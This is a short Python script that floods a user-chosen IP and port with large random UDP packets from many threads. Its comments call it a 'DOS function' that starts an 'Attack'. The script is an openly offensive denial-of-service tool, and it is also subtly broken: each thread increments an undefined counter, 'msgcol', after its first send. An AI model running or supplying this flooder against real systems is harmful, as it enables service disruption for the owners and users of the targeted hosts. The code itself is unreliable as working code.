import socket
import random
import string
from threading import Thread

UDP_IP = input("TARGET IP:")
UDP_PORT = int(input("TARGET PORT:"))
Threads = int(input("Threads:"))

message = ""
chars = string.ascii_letters + string.digits

#Generation pocket
password =''
for i in range(15872):
    password += random.choice(chars)

#Preparing to send
message = message + password
message = message.encode()
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 

def bye(): # DOS function
    while True:
        sock.sendto(message, (UDP_IP, UDP_PORT))
        msgcol = msgcol + 1 
        print ("1 message send")

for i in range(Threads): #Start Attack
    th = Thread(target=bye)
    th.start()
